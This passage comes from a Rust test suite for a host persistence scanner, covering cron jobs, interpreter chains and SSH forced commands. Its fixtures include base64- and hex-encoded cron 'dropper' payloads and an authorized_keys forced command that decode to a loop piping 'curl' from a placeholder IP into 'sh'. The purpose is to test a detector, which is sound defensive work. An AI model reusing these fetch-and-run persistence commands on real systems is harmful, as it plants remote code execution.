            .collect();
        write("var/lib/dpkg/info/backup-tools.md5sums", sums.as_bytes());

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Referencing)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);

        let mut chained: Vec<(&str, &str)> = scan
            .entries
            .iter()
            .filter_map(|e| Some((e.name.as_str(), e.raw.get("chain")?.as_str())))
            .collect();
        chained.sort_unstable();
        assert_eq!(
            chained,
            [
                ("/bin/sh", "shebang"),
                ("/opt/python3.11/bin/python", "shebang"),
                ("/opt/tool", "exec"),
                ("/opt/\u{fffd}\u{fffd}/py", "shebang"),
                ("/tmp/stage.sh", "source"),
                ("python3", "shebang"),
            ],
            "a fifo must not be read and a file with no shebang is not a script"
        );

        // The finding: a packaged, unmodified cron file runs a packaged,
        // unmodified script, and the interpreter that script names is owned
        // by nothing.
        let job = find(&scan, "collect");
        assert!(crate::render::suppressed(job), "the job itself is ordinary: {:?}", job.flags);
        let hijack = find(&scan, "/opt/python3.11/bin/python");
        assert_eq!(hijack.kind, Kind::Cron, "the mechanism that runs it is still cron");
        assert_eq!(hijack.source, dir.join("etc/cron.d/collect"));
        assert_eq!(hijack.raw["chain_from"], dir.join("usr/local/bin/collect").to_string_lossy());
        assert_eq!(hijack.raw["declared_by_entry"], job.id);
        // The row is about the interpreter, so its own verdict is the
        // interpreter's — no separate target_provenance note is needed.
        assert_eq!(hijack.provenance, Provenance::Unpackaged);
        assert_eq!(hijack.trigger, Trigger::Schedule, "it fires when its carrier does");
        assert_eq!(hijack.principal.as_deref(), Some("root"));
        assert!(hijack.has_flag(Flag::TargetMissing));
        assert!(!crate::render::suppressed(hijack), "which is the whole point of the entry");

        // The ordinary case is recorded and then hidden by provenance rather
        // than by a list of interpreter names.
        let sh = find(&scan, "/bin/sh");
        assert_eq!(sh.target_path, Some(dir.join("bin/sh")));
        assert!(
            matches!(&sh.provenance, Provenance::Packaged { package, .. } if package == "backup-tools"),
            "got {:?}",
            sh.provenance
        );
        assert!(crate::render::suppressed(sh), "an intact /bin/sh is noise: {:?}", sh.flags);

        // `env` names the argument, not itself, and which python3 that is
        // depends on the search path.
        let env = find(&scan, "python3");
        assert_eq!(env.target_path, Some(dir.join("usr/local/bin/python3")));
        assert_eq!(env.raw["target_resolved_from"], "search path");

        assert!(find(&scan, "/tmp/stage.sh").has_flag(Flag::TargetMissing));
        assert_eq!(find(&scan, "/opt/tool").target_path, Some(dir.join("opt/tool")));
        assert!(
            find(&scan, "/opt/\u{fffd}\u{fffd}/py").has_flag(Flag::EncodingAnomaly),
            "a shebang that is not UTF-8 is evidence, not a crash"
        );

        let mut ids: Vec<&String> = scan.entries.iter().map(|e| &e.id).collect();
        ids.sort_unstable();
        let total = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), total, "every synthesised entry needs its own identity");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    /// base64 of a 77-byte shell loop — what `echo … | base64 -d | sh`
    /// actually carries — and the same shape hex-encoded.
    const B64_PAYLOAD: &str =
        "IyEvYmluL3NoCndoaWxlIDo7IGRvIGN1cmwgLWZzU0wgaHR0cDovLzE5OC41MS4xMDAuNy9zIHwgc2g7IHNsZWVwIDYwMDsgZG9uZQo=";
    const HEX_PAYLOAD: &str = "23212f62696e2f73680a7768696c65203a3b20646f206375726c202d6673534c20687474703a2f2f3139382e35312e3130302e372f737461676532207c2073683b20736c656570203630303b20646f6e650a6578697420300a";
    /// A sha256 digest as `pip --require-hashes` writes it: 64 hex characters
    /// in a command that is doing exactly what it is supposed to.
    const SHA256: &str = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
    /// The sha1 directory name in an Autodesk Wine launcher on this host —
    /// the longest hex run any real command in the measurement carried.
    const WINE: &str = "sh -c 'wine \"/home/u/.wine/drive_c/Program Files/Autodesk/webdeploy/production/2b84ec48843dc39cc73fec4274fad44f45968ec2/Autodesk Identity Manager/AdskIdentityManager.exe\" \"%u\"'";

    struct Encoded;

    impl Collector for Encoded {
        fn name(&self) -> &'static str {
            "encoded"
        }

        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
            let jobs: Vec<(Kind, &str, &str, Vec<u8>)> = vec![
                (
                    Kind::Cron,
                    "etc/cron.d/dropper",
                    "dropper",
                    format!("echo {B64_PAYLOAD} | base64 -d | sh").into_bytes(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/hexdropper",
                    "hexdropper",
                    format!("echo {HEX_PAYLOAD} | xxd -r -p | sh").into_bytes(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/pip",
                    "pip",
                    format!("/usr/bin/pip install --require-hashes --hash=sha256:{SHA256} requests")
                        .into_bytes(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/generator",
                    "generator",
                    b"/usr/lib/systemd/system-generators/systemd-hibernate-resume-generator --dry-run".to_vec(),
                ),
                (Kind::Cron, "etc/cron.d/wine", "wine", WINE.as_bytes().to_vec()),
                (
                    Kind::Cron,
                    "etc/cron.d/lvm",
                    "lvm",
                    b"/usr/bin/env LVM_SUPPRESS_LOCKING_FAILURE_MESSAGES=1 /usr/sbin/lvm vgchange -aay".to_vec(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/mount",
                    "mount",
                    b"/usr/bin/mount /dev/disk/by-uuid/123e4567-e89b-12d3-a456-426614174000 /mnt/data".to_vec(),
                ),
                // Padding characters alone, and bytes that are not UTF-8 at
                // all: neither is a run, and neither may panic the pass.
                (Kind::Cron, "etc/cron.d/padding", "padding", b"==== ============".to_vec()),
                (Kind::Cron, "etc/cron.d/raw", "raw", vec![0xff; 200]),
                // An ordinary forced command behind a key whose fingerprint —
                // 44 base64 characters — is the entry's name, not its command.
                (
                    Kind::SshAuthorizedKey,
                    "root/.ssh/authorized_keys",
                    "SHA256:pyEwQNS9tWtxBjLUwlnHcXVELdTeMMRFDmDW6C/fqPs",
                    b"/usr/bin/rrsync -ro /srv/backup".to_vec(),
                ),
                (
                    Kind::SshAuthorizedKey,
                    "root/.ssh/authorized_keys",
                    "SHA256:hQ9tVqpJxS1ZrEoKnT3uWgYd8mLbC5fN0aXiR7vPjUw",
                    format!("sh -c 'echo {B64_PAYLOAD} | base64 -d | sh'").into_bytes(),
                ),
            ];

            jobs.into_iter()
                .map(|(kind, source, name, command)| {
                    let mut e = cx.entry(kind, source, name);
                    e.trigger = Trigger::Schedule;
                    e.principal = Some("root".to_string());
                    if kind == Kind::SshAuthorizedKey {
                        e.note("ssh_mechanism", "authorized-key");
                        e.note("options", format!("command=\"{}\"", String::from_utf8_lossy(&command)));
                    }
                    e.command = Some(command);
                    e
                })
                .collect()
        }
    }

    #[test]
    fn an_encoded_payload_is_reported_and_a_digest_is_not() {
        let dir = std::env::temp_dir().join(format!("unbidden-encoding-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("etc/cron.d")).unwrap();
        std::fs::create_dir_all(dir.join("root/.ssh")).unwrap();
        for job in ["dropper", "hexdropper", "pip", "generator", "wine", "lvm", "mount", "padding", "raw"] {
            std::fs::write(dir.join("etc/cron.d").join(job), b"@daily root x\n").unwrap();
        }
        std::fs::write(dir.join("root/.ssh/authorized_keys"), b"ssh-ed25519 AAAA\n").unwrap();

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Encoded)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);

        let dropper = find(&scan, "dropper");
        assert!(dropper.has_flag(Flag::EncodingAnomaly));
        assert_eq!(
            dropper.raw["encoded_run"],
            format!("base64, {} chars at offset 5", B64_PAYLOAD.len()),
            "the operator is told where to look without being handed a decode"
        );

        let hex = find(&scan, "hexdropper");
        assert!(hex.has_flag(Flag::EncodingAnomaly));
        assert_eq!(hex.raw["encoded_run"], format!("hex, {} chars at offset 5", HEX_PAYLOAD.len()));

        // Everything a working host does with long encoding-alphabet runs.
        for ordinary in ["pip", "generator", "wine", "lvm", "mount", "padding", "raw"] {
            let e = find(&scan, ordinary);
            assert!(
                !e.has_flag(Flag::EncodingAnomaly),
                "{ordinary} is an ordinary command: {}",
                String::from_utf8_lossy(e.command.as_deref().unwrap_or_default())
            );
            assert!(!e.raw.contains_key("encoded_run"));
        }

        // The key material never reaches `command` — the fingerprint is the
        // name and the blob stays in the file — so the kind needs no
        // exemption, and the forced command is read like any other.
        let key = find(&scan, "SHA256:pyEwQNS9tWtxBjLUwlnHcXVELdTeMMRFDmDW6C/fqPs");
        assert!(!key.has_flag(Flag::EncodingAnomaly), "a key blob is not a payload in a command");
        let forced = find(&scan, "SHA256:hQ9tVqpJxS1ZrEoKnT3uWgYd8mLbC5fN0aXiR7vPjUw");
        assert!(forced.has_flag(Flag::EncodingAnomaly), "a forced command is where a key line hides one");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_run_ends_at_the_characters_that_make_a_path_or_a_uuid() {
        // Both sides of every threshold, on the bytes alone.
        let at = |s: &str| encoded_run(s.as_bytes()).map(|(o, l, a)| (o, l, a));
        assert_eq!(at(&"X".repeat(47)), None);
        assert_eq!(at(&"X".repeat(48)), Some((0, 48, "base64")));
        assert_eq!(at(&"a".repeat(159)), None, "still hex, still under the hex threshold");
        assert_eq!(at(&"a".repeat(160)), Some((0, 160, "hex")));
        // A digest is a hex run whichever case it is written in, which is the
        // whole reason the two thresholds differ.
        assert_eq!(at(&"A".repeat(64)), None, "a sha256 in capitals is still a sha256");
        assert_eq!(
            at(&format!("g{}", "a".repeat(47))),
            Some((0, 48, "base64")),
            "one character outside the hex alphabet changes which threshold applies"
        );
        // A path and a UUID are runs only if the separators are not.
        assert_eq!(at(&format!("/usr/{}/{}", "x".repeat(40), "y".repeat(40))), None);
        assert_eq!(at(&format!("{}-{}-{}", "x".repeat(40), "y".repeat(40), "z".repeat(40))), None);
        // `=` counts as padding, never as a join between two runs.
        assert_eq!(at(&format!("{}={}", "X".repeat(40), "Y".repeat(40))), None);
        assert_eq!(at(&format!("{}==", "X".repeat(46))), Some((0, 48, "base64")));
        // The longest qualifying run is the one reported.
        assert_eq!(at(&format!("{} {}", "X".repeat(50), "Y".repeat(60))), Some((51, 60, "base64")));
        assert_eq!(encoded_run(b""), None);
        assert_eq!(encoded_run(&[0xff; 300]), None);
    }
}
